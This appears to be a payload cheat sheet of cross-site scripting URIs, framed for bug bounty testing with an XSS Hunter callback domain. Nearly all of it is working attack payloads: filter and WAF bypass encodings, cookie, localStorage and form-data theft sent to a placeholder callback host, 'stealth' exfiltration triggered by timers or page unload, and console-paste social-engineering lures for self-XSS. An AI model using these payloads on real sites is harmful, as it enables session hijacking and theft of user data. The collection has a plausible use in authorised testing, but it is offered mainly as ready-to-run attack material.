# XSS Hunter Advanced Payload URI Collection
# Professional Bug Bounty XSS URI Payloads with Advanced Bypass Techniques
# 
# Usage Instructions:
# - Replace [DOMAIN] with your XSS Hunter domain (https://example.bxss.in or https://js.rip/example)
# - Replace [DATA_VALUE] & [COOKIE_VALUE] with the data/cookie you want to exfiltrate
# - Use these URIs in URL parameters, href attributes, src attributes, etc.
# - Test in different contexts: HTML, JavaScript, CSS, HTTP headers
#
# Categories:
# 1. JavaScript Protocol URIs
# 2. Data Protocol URIs  
# 3. HTTP/HTTPS Callback URIs
# 4. Advanced Bypass URIs
# 5. Context-Specific URIs
# 6. WAF Bypass URIs
# 7. Browser-Specific URIs
# 8. Polyglot URIs

# ================================
# 1. JAVASCRIPT PROTOCOL URIS
# ================================

# Basic JavaScript execution
javascript:alert(1)
javascript:alert('XSS')
javascript:alert(document.domain)
javascript:alert(document.cookie)
javascript:confirm(1)
javascript:prompt(1)

# XSS Hunter callbacks via JavaScript
javascript:fetch('[DOMAIN]?cookie='+document.cookie)
javascript:fetch('[DOMAIN]?data='+btoa(document.cookie))
javascript:new Image().src='[DOMAIN]?'+document.cookie
javascript:navigator.sendBeacon('[DOMAIN]',document.cookie)

# Advanced JavaScript payloads
javascript:eval(atob('YWxlcnQoMSk='))
javascript:Function('alert(1)')()
javascript:setTimeout('alert(1)',0)
javascript:setInterval('alert(1)',1000)
javascript:(function(){alert(1)})()
javascript:[].constructor.constructor('alert(1)')()

# JavaScript with encoding bypasses
javascript:alert(String.fromCharCode(88,83,83))
javascript:alert(unescape('%58%53%53'))
javascript:alert(/XSS/.source)
javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))

# JavaScript with obfuscation
javascript:window['ale'+'rt'](1)
javascript:window[atob('YWxlcnQ=')](1)
javascript:this['ale'+'rt'](1)
javascript:globalThis['alert'](1)

# ================================
# 2. DATA PROTOCOL URIS
# ================================

# Basic data URIs
data:text/html,<script>alert(1)</script>
data:text/html,<img src=x onerror=alert(1)>
data:text/html,<svg onload=alert(1)>
data:text/html,<iframe src=javascript:alert(1)>
data:text/html,<object data=javascript:alert(1)>

# Base64 encoded data URIs
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==
data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgxKT4=

# Data URIs with XSS Hunter callbacks
data:text/html,<script>fetch('[DOMAIN]?'+document.cookie)</script>
data:text/html,<img src=x onerror=fetch('[DOMAIN]?'+document.cookie)>
data:text/html,<svg onload=navigator.sendBeacon('[DOMAIN]',document.cookie)>

# Data URIs with advanced payloads
data:text/html,<script>eval(atob('ZmV0Y2goJ2h0dHBzOi8vc2l4LmJ4c3MuaW4/Jytkb2N1bWVudC5jb29raWUp'))</script>
data:text/html,<script>Function(atob('YWxlcnQoMSk='))()</script>
data:text/html,<script>setTimeout(atob('YWxlcnQoMSk='),0)</script>

# ================================
# 3. HTTP/HTTPS CALLBACK URIS
# ================================

# Basic HTTP callbacks
[DOMAIN]
[DOMAIN]?cookie=COOKIE_VALUE
[DOMAIN]?data=DATA_VALUE
[DOMAIN]?url=CURRENT_URL
[DOMAIN]?domain=CURRENT_DOMAIN

# Custom domain callbacks
[DOMAIN]
[DOMAIN]?cookie=COOKIE_VALUE
[DOMAIN]?data=DATA_VALUE
[DOMAIN]?url=CURRENT_URL
[DOMAIN]?domain=CURRENT_DOMAIN

# Encoded callback URIs
[DOMAIN]?data=%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65
[DOMAIN]?data=%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65
[DOMAIN]?data=ZG9jdW1lbnQuY29va2ll
[DOMAIN]?data=ZG9jdW1lbnQuY29va2ll

# Callback URIs with multiple parameters
[DOMAIN]?cookie=COOKIE&url=URL&referrer=REFERRER&useragent=UA
[DOMAIN]?cookie=COOKIE&url=URL&referrer=REFERRER&useragent=UA
[DOMAIN]?data=COOKIE&timestamp=TIMESTAMP&random=RANDOM
[DOMAIN]?data=COOKIE&timestamp=TIMESTAMP&random=RANDOM

# ================================
# 4. ADVANCED BYPASS URIS
# ================================

# Protocol bypass variations
JAVASCRIPT:alert(1)
Javascript:alert(1)
JaVaScRiPt:alert(1)
java%0ascript:alert(1)
java%0dscript:alert(1)
java%09script:alert(1)
java%0cscript:alert(1)

# Null byte bypasses
javascript%00:alert(1)
javascript:%00alert(1)
javascript:alert%00(1)
javascript:alert(1)%00

# Unicode bypasses
javascript\u003aalert(1)
\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
j\u0061v\u0061script:alert(1)
javascrip\u0074:alert(1)

# HTML entity bypasses
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)
&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;alert(1)
&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;alert(1)

# Double encoding bypasses
%6a%61%76%61%73%63%72%69%70%74%3aalert(1)
%256a%2561%2576%2561%2573%2563%2572%2569%2570%2574%253aalert(1)
%25%36%61%25%36%31%25%37%36%25%36%31%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%61alert(1)

# ================================
# 5. CONTEXT-SPECIFIC URIS
# ================================

# For href attributes
javascript:alert(1)
javascript:alert(document.domain)
javascript:fetch('[DOMAIN]?'+document.cookie)
data:text/html,<script>alert(1)</script>

# For src attributes
javascript:alert(1)
data:text/html,<script>alert(1)</script>
[DOMAIN]/xss.js
[DOMAIN]/payload.js

# For action attributes
javascript:alert(1)
javascript:fetch('[DOMAIN]?'+new FormData(this))
[DOMAIN]/collect
[DOMAIN]/collect

# For CSS url() values
javascript:alert(1)
data:text/html,<script>alert(1)</script>
[DOMAIN]/style.css?'+document.cookie+'

# For meta refresh
javascript:alert(1)
data:text/html,<script>alert(1)</script>
[DOMAIN]?redirect='+location.href+'

# ================================
# 6. WAF BYPASS URIS
# ================================

# CloudFlare bypasses
javascript:/**/alert(1)
javascript:alert/**/(1)
javascript:alert(/**/1)
javascript:window['ale'+'rt'](1)
javascript:this['alert'](1)

# ModSecurity bypasses
javascript:alert(String.fromCharCode(88,83,83))
javascript:alert(/XSS/.source)
javascript:alert(atob('WFNT'))
javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))

# AWS WAF bypasses
javascript:alert`1`
javascript:(alert)(1)
javascript:window["alert"](1)
javascript:window["ale"+"rt"](1)

# Generic WAF bypasses
javascript:eval(atob('YWxlcnQoMSk='))
javascript:Function('ale'+'rt(1)')()
javascript:setTimeout('ale'+'rt(1)',0)
javascript:[]['constructor']['constructor']('alert(1)')()

# Case variation bypasses
JAVASCRIPT:ALERT(1)
Javascript:Alert(1)
JaVaScRiPt:AlErT(1)
javascript:ALERT(1)

# ================================
# 7. BROWSER-SPECIFIC URIS
# ================================

# Chrome/Chromium specific
javascript:alert(1)
javascript:console.log('XSS')
javascript:debugger;alert(1)
chrome-extension://invalid/

# Firefox specific
javascript:alert(1)
javascript:console.log('XSS')
moz-extension://invalid/
resource://invalid/

# Safari specific
javascript:alert(1)
javascript:console.log('XSS')
webkit://invalid/

# Internet Explorer specific
javascript:alert(1)
javascript:execScript('alert(1)')
vbscript:msgbox("XSS")
ms-help://invalid/

# Edge specific
javascript:alert(1)
javascript:console.log('XSS')
ms-browser-extension://invalid/

# ================================
# 8. POLYGLOT URIS
# ================================

# Multi-context polyglots
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=alert()//>
javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle=alert()>

# Protocol-agnostic polyglots
//[DOMAIN]/xss.js
//[DOMAIN]/payload.js
///[DOMAIN]/xss.js
///[DOMAIN]/payload.js

# ================================
# 9. ADVANCED EXFILTRATION URIS
# ================================

# Complete data exfiltration
javascript:fetch('[DOMAIN]',{method:'POST',body:JSON.stringify({url:location.href,cookie:document.cookie,localStorage:localStorage,sessionStorage:sessionStorage})})
javascript:new Image().src='[DOMAIN]?'+btoa(JSON.stringify({domain:document.domain,cookie:document.cookie,url:location.href}))
javascript:navigator.sendBeacon('[DOMAIN]',JSON.stringify({cookie:document.cookie,url:location.href,referrer:document.referrer}))

# Stealth exfiltration
javascript:setTimeout(()=>fetch('[DOMAIN]?'+document.cookie),5000)
javascript:document.addEventListener('click',()=>fetch('[DOMAIN]?'+document.cookie))
javascript:window.addEventListener('beforeunload',()=>navigator.sendBeacon('[DOMAIN]',document.cookie))

# Form data exfiltration
javascript:fetch('[DOMAIN]',{method:'POST',body:new FormData(document.forms[0])})
javascript:new Image().src='[DOMAIN]?form='+btoa(new FormData(document.forms[0]))

# ================================
# 10. SELF-XSS EXPLOITATION URIS
# ================================

# Console manipulation URIs
javascript:console.log('%cSecurity Check','color:red;font-size:20px;');console.log('Paste: alert(1)');
javascript:console.clear();console.log('%cWARNING','color:red;font-weight:bold;font-size:50px;');
javascript:console.log('Execute: eval(atob("YWxlcnQoMSk="))');

# Clipboard manipulation
javascript:navigator.clipboard.writeText('alert(1)').then(()=>console.log('Payload copied'))
javascript:document.addEventListener('paste',e=>eval(e.clipboardData.getData('text')))

# Social engineering
javascript:alert('Press F12 and paste: alert(document.cookie)')
javascript:prompt('Debug mode - paste this:','alert(1)')
javascript:confirm('Execute security check?')&&eval('alert(1)')

# ================================
# 11. DOM-BASED XSS URIS
# ================================

# Location-based DOM XSS
javascript:eval(location.hash.slice(1))
javascript:eval(location.search.slice(1))
javascript:document.write(location.hash.slice(1))
javascript:document.body.innerHTML=location.search.slice(1)

# URL parameter exploitation
javascript:new URLSearchParams(location.search).get('xss')
javascript:eval(new URL(location).searchParams.get('payload'))
javascript:document.write(decodeURIComponent(location.search))

# Fragment identifier exploitation
javascript:eval(location.hash.substring(1))
javascript:Function(location.hash.slice(1))()
javascript:setTimeout(location.hash.slice(1),0)

# ================================
# 12. ENCODING VARIATIONS
# ================================

# URL encoded variations
%6a%61%76%61%73%63%72%69%70%74%3a%61%6c%65%72%74%28%31%29
%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%31%29

# Double URL encoded
%256a%2561%2576%2561%2573%2563%2572%2569%2570%2574%253a%2561%256c%2565%2572%2574%2528%2531%2529

# HTML entity encoded
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;

# Hex encoded
\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x28\x31\x29

# Unicode encoded
\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029

# ================================
# 13. PROTOCOL CONFUSION
# ================================

# Mixed protocols
http://javascript:alert(1)
https://javascript:alert(1)
ftp://javascript:alert(1)
file://javascript:alert(1)

# Protocol-relative
//javascript:alert(1)
///javascript:alert(1)
////javascript:alert(1)

# Invalid protocols
invalid://javascript:alert(1)
custom://javascript:alert(1)
unknown://javascript:alert(1)

# ================================
# 14. SPECIAL CHARACTERS
# ================================

# With special characters
javascript:alert(1);//
javascript:alert(1);/**/
javascript:alert(1);#
javascript:alert(1);--

# With whitespace
javascript: alert(1)
javascript:	alert(1)
javascript:
alert(1)

# With comments
javascript:/*comment*/alert(1)
javascript://comment
alert(1)
javascript:<!--comment-->alert(1)

# ================================
# USAGE EXAMPLES
# ================================

# Example 1: URL parameter injection
# Original: https://example.com/page?redirect=https://google.com
# Payload: https://example.com/page?redirect=javascript:alert(1)

# Example 2: href attribute injection
# Original: <a href="https://google.com">Link</a>
# Payload: <a href="javascript:alert(1)">Link</a>

# Example 3: src attribute injection
# Original: <iframe src="https://example.com"></iframe>
# Payload: <iframe src="javascript:alert(1)"></iframe>

# Example 4: CSS url() injection
# Original: background: url('https://example.com/image.jpg');
# Payload: background: url('javascript:alert(1)');

# Example 5: meta refresh injection
# Original: <meta http-equiv="refresh" content="0;url=https://google.com">
# Payload: <meta http-equiv="refresh" content="0;url=javascript:alert(1)">

# ================================
# TESTING METHODOLOGY
# ================================

# 1. Test in different contexts:
#    - URL parameters
#    - HTML attributes (href, src, action, etc.)
#    - CSS properties
#    - JavaScript strings
#    - HTTP headers

# 2. Try different encodings:
#    - URL encoding
#    - HTML entity encoding
#    - Unicode encoding
#    - Base64 encoding

# 3. Test browser-specific behaviors:
#    - Chrome/Chromium
#    - Firefox
#    - Safari
#    - Internet Explorer/Edge

# 4. Test WAF bypasses:
#    - Case variations
#    - Encoding variations
#    - Obfuscation techniques
#    - Protocol confusion

# 5. Test payload variations:
#    - Different JavaScript functions
#    - Different protocols
#    - Different data exfiltration methods
#    - Different callback domains
